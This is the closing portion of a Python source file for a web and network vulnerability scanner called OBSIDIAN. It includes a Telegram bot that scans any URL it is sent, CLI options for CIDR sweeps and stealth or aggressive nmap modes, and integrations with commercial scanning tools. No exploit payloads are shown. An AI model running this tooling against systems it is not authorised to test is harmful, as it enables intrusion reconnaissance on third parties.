            r=requests.get(f"https://api.telegram.org/bot{token}/getUpdates",
                           params={"offset":offset,"timeout":30},timeout=35)
            for upd in r.json().get("result",[]):
                offset=upd["update_id"]+1
                if "message" not in upd: continue
                cid=upd["message"]["chat"]["id"]
                text=upd["message"].get("text","").strip()
                def send(msg): requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                               data={"chat_id":cid,"text":msg,"parse_mode":"HTML"})
                if text=="/start":
                    send("<b>☠ OBSIDIAN v10.0 Online</b>\n\n"
                         "Commands:\n"
                         "<code>/scan https://target.com</code> — Full OWASP+MITRE scan\n"
                         "<code>/quick https://target.com</code> — Fast scan (no crawl)\n"
                         "<code>/status</code> — Health check\n"
                         "<code>/version</code> — Version info")
                elif text=="/status":
                    send(f"☠ <b>OBSIDIAN v{VERSION}</b> — Operational ✓\n"
                         f"Modules: 69 | Tools: 40+ | OWASP: A01-A10 + API1-API10")
                elif text=="/version":
                    send(f"<b>OBSIDIAN</b>\n"
                         f"Version: {VERSION}\nModules: 69\n"
                         f"OWASP: Web Top 10 + API Top 10\nMITRE: 29 techniques")
                elif text.startswith(("/scan","/quick")):
                    cmd_name = text.split()[0]
                    parts=text.split()
                    if len(parts)<2: send(f"Usage: {cmd_name} &lt;url&gt;"); continue
                    url=parts[1]
                    no_crawl = (cmd_name == "/quick")
                    if not url.startswith(("http://","https://")): url="https://"+url
                    send(f"🔍 Scanning: {url}\n⏳ OWASP Top 10 + MITRE ATT&CK analysis...")
                    ts=datetime.now().strftime("%Y%m%d_%H%M%S"); out=f"tg_{ts}.json"
                    try:
                        run_scan(url,output=out,html=True,skip_crawl=no_crawl)
                        c=json.loads(open(out).read()); m=c["meta"]; s=c["summary"]
                        owasp_str="\n".join(f"  {k}: {v}" for k,v in c.get("owasp_breakdown",{}).items())
                        send(f"<b>✅ SCAN COMPLETE</b>\n\n🎯 {url}\n📊 Risk: {m['risk_score']}%\n"
                             f"⏱ {m['duration_seconds']}s\n\n🔴 {s['Critical']} 🟠 {s['High']} 🟡 {s['Medium']} 🟢 {s['Low']}\n\n"
                             f"<b>OWASP:</b>\n{owasp_str}")
                        for fpath in [out,out.replace(".json",".html")]:
                            if os.path.exists(fpath):
                                requests.post(f"https://api.telegram.org/bot{token}/sendDocument",
                                    data={"chat_id":cid},files={"document":open(fpath,"rb")})
                    except Exception as e: send(f"❌ Failed: {str(e)[:200]}")
            time.sleep(1)
        except KeyboardInterrupt: print(f"\n  {C.YLW}[!] Bot stopped.{C.RST}\n"); break
        except Exception as e: logger.log("BOT",f"Error: {e}","ERROR"); time.sleep(5)

# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────
def parse_args():
    p=argparse.ArgumentParser(prog="obsidian_core.py",
        description="OBSIDIAN v10.0 — 100 Modules | CVSS v3.1 | 15 Enterprise Tools | Zero-FP | Auto-Install",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python obsidian_core.py                              # Interactive UI
  python obsidian_core.py -u https://target.com        # Direct scan
  python obsidian_core.py -u https://target.com --html --threads 10
  python obsidian_core.py -u https://target.com --proxy http://127.0.0.1:8080
  python obsidian_core.py --clone-arsenal              # Clone tool repos
        """)
    p.add_argument("-u","--url",        default=None, help="Single target URL")
    p.add_argument("-f","--file",       default=None, help="File of targets (one per line)")
    p.add_argument("--cidr",            default=None, help="CIDR range e.g. 192.168.1.0/24")
    p.add_argument("-o","--output",     default=None, help="Output filename")
    p.add_argument("--output-dir",      default=None, help="Output directory for multi-target")
    p.add_argument("--cookie",          default=None, help="Cookie header e.g. 'session=abc123'")
    p.add_argument("--header",          action="append", default=[],
                                        help="Custom header (repeatable) e.g. 'Authorization: Bearer TOKEN'")
    p.add_argument("--min-severity",    default=None,
                                        choices=["Info","Low","Medium","High","Critical"],
                                        help="Minimum severity to report")
    p.add_argument("--verbose","-v",    action="store_true", help="Show raw HTTP requests/responses")
    p.add_argument("--resume",          action="store_true", help="Resume interrupted scan from checkpoint")
    p.add_argument("--diff",            default=None, help="Compare with previous scan JSON (report delta)")
    p.add_argument("--format",          default="json",
                                        choices=["json","html","csv","sarif","markdown","all"])
    # Enterprise tool flags
    p.add_argument("--zap-url",         default="http://localhost:8080", help="OWASP ZAP URL")
    p.add_argument("--zap-key",         default="",   help="OWASP ZAP API key")
    p.add_argument("--openvas-host",    default="localhost", help="OpenVAS/GVM host")
    p.add_argument("--openvas-user",    default="admin")
    p.add_argument("--openvas-pass",    default="admin")
    p.add_argument("--nessus-host",     default="localhost", help="Nessus host")
    p.add_argument("--nessus-user",     default="admin")
    p.add_argument("--nessus-pass",     default="admin")
    p.add_argument("--tenable-access",  default="", help="Tenable.io access key")
    p.add_argument("--tenable-secret",  default="", help="Tenable.io secret key")
    p.add_argument("--tenable-cloud",   action="store_true", help="Use Tenable.io cloud")
    p.add_argument("--acunetix-url",    default="https://localhost:3443")
    p.add_argument("--acunetix-key",    default="", help="Acunetix API key")
    p.add_argument("--burp-url",        default="http://localhost:1337")
    p.add_argument("--burp-key",        default="", help="Burp Suite API key")
    p.add_argument("--qualys-user",     default="")
    p.add_argument("--qualys-pass",     default="")
    p.add_argument("--akto-url",        default="http://localhost:9090")
    p.add_argument("--akto-key",        default="", help="Akto API key")
    p.add_argument("--threatmapper-url",default="http://localhost:9992")
    p.add_argument("--threatmapper-key",default="", help="ThreatMapper API key")
    p.add_argument("--vulnvas-url",     default="http://localhost:8080")
    p.add_argument("--vulnvas-key",     default="", help="VulnVAS API key")
    p.add_argument("--nmap-mode",       default="full",
                                        choices=["quick","full","vuln","stealth","aggressive","udp"],
                                        help="nmap scan profile")
    p.add_argument("--nuclei-templates",default=None, help="Custom Nuclei templates directory")
    p.add_argument("--enterprise",      action="store_true",
                                        help="Run all available enterprise tool integrations")
    p.add_argument("--html",         action="store_true")
    p.add_argument("--proxy",        default=None)
    p.add_argument("--threads",      type=int,default=THREADS)
    p.add_argument("--no-crawl",     action="store_true")
    p.add_argument("--no-install",   action="store_true")
    p.add_argument("--clone-arsenal",action="store_true")
    p.add_argument("--version",      action="version",version=f"OBSIDIAN v{VERSION}")
    return p.parse_args()

# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    args=parse_args()
    # Tools auto-install during scan — no manual step needed
    show_banner()

    # ── Handle scan diff ──────────────────────────────────────────────────────
    if args.diff:
        if not args.url and not args.file:
            print(f"  {C.RED}--diff requires a scan to compare against. Run a scan first.{C.RST}")
            return
        # Run new scan first, then diff
        pass  # handled below after scan

    # ── Parse custom headers ──────────────────────────────────────────────────
    headers_extra = {}
    for h in (args.header or []):
        if ":" in h:
            k, _, v = h.partition(":")
            headers_extra[k.strip()] = v.strip()

    # ── Parse cookies ─────────────────────────────────────────────────────────
    cookies_val = args.cookie if hasattr(args,'cookie') else None

    # ── Multi-target: --file ──────────────────────────────────────────────────
    if hasattr(args,'file') and args.file:
        verify_and_install_tools(not args.no_install)
        try:
            targets = [l.strip() for l in open(args.file)
                       if l.strip() and not l.strip().startswith("#")]
        except Exception as e:
            print(f"  {C.RED}Cannot read targets file: {e}{C.RST}"); return
        out_dir = getattr(args,'output_dir',None) or "obs_reports"
        run_multi_target(targets, proxy=args.proxy, output_dir=out_dir,
                        html=args.html, skip_crawl=args.no_crawl,
                        auto_install=False, threads=args.threads,
                        min_severity=getattr(args,'min_severity',None),
                        cookies=cookies_val, headers_extra=headers_extra or None,
                        verbose=getattr(args,'verbose',False))
        return

    # ── Multi-target: --cidr ──────────────────────────────────────────────────
    if hasattr(args,'cidr') and args.cidr:
        verify_and_install_tools(not args.no_install)
        try:
            import ipaddress
            net     = ipaddress.ip_network(args.cidr, strict=False)
            targets = [str(ip) for ip in net.hosts()]
            print(f"  {C.GRN}CIDR {args.cidr} → {len(targets)} hosts{C.RST}")
        except Exception as e:
            print(f"  {C.RED}Invalid CIDR: {e}{C.RST}"); return
        out_dir = getattr(args,'output_dir',None) or "obs_reports"
        run_multi_target(targets, proxy=args.proxy, output_dir=out_dir,
                        html=args.html, skip_crawl=args.no_crawl,
                        auto_install=False, threads=args.threads,
                        min_severity=getattr(args,'min_severity',None),
                        cookies=cookies_val, headers_extra=headers_extra or None,
                        verbose=getattr(args,'verbose',False))
        return

    # ── Single target ─────────────────────────────────────────────────────────
    if args.url:
        out_dir  = Path(getattr(args,'output_dir',None) or '.')
        out_dir.mkdir(parents=True, exist_ok=True)
        out_base = args.output or f"dd_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        out      = str(out_dir / out_base)
        verify_and_install_tools(not args.no_install)
        out_fmt  = getattr(args,'format','json') or 'json'
        out_files = run_scan(
            target=args.url, proxy=args.proxy, output=out,
            html=(args.html or out_fmt in ("html","all")),
            skip_crawl=args.no_crawl, auto_install=not args.no_install,
            threads=args.threads,
            min_severity=getattr(args,'min_severity',None),
            cookies=cookies_val,
            headers_extra=headers_extra or None,
            verbose=getattr(args,'verbose',False),
            resume=getattr(args,'resume',False),
            output_format=out_fmt,
            nmap_mode=getattr(args,'nmap_mode','full'),
            nuclei_templates=getattr(args,'nuclei_templates',None))
        # ── Diff against previous scan ────────────────────────────────────────
        if args.diff and out_files:
            diff_reports(args.diff, out_files[0])
        return
    while True:
        clr(); show_banner(); choice=show_main_menu()
        if choice=="1":
            clr(); show_banner(); cfg=collect_scan_config()
            if not cfg: continue
            clr(); show_scan_start(cfg["url"])
            # Auto-install all tools silently — no menu needed
            verify_and_install_tools(auto=True)
            run_scan(target=cfg["url"], proxy=cfg["proxy"],
                     output=cfg["output"], html=cfg["html"],
                     skip_crawl=cfg["skip_crawl"],
                     auto_install=True, threads=cfg["threads"],
                     nmap_mode=cfg.get("nmap_mode","full"),
                     nuclei_templates=cfg.get("nuclei_templates",None))
            print(); prompt("  ┗━━► Press ENTER to return …", C.DIM)
        elif choice=="2": enterprise_tool_mode()
        elif choice in("0","q","exit","quit"):
            clr()
            print(f"\n  {C.PUR}{C.BLD}☠  OBSIDIAN v10.0 — Session Ended  ☠{C.RST}")
            print(f"  {C.DIM}{random.choice(QUOTES)}{C.RST}\n")
            sys.exit(0)
        else:
            print(f"\n  {C.RED}✗  Invalid choice. Select 1 / 2 / 0{C.RST}")
            time.sleep(1)

if __name__=="__main__":
    if os.name!="nt" and hasattr(os,"geteuid") and os.geteuid()!=0:
        print(f"\033[93m[!] Running without root — naabu may need sudo.\033[0m\n")
    try: main()
    except KeyboardInterrupt: print(f"\n\n  \033[93m[!] Interrupted.\033[0m\n"); sys.exit(0)
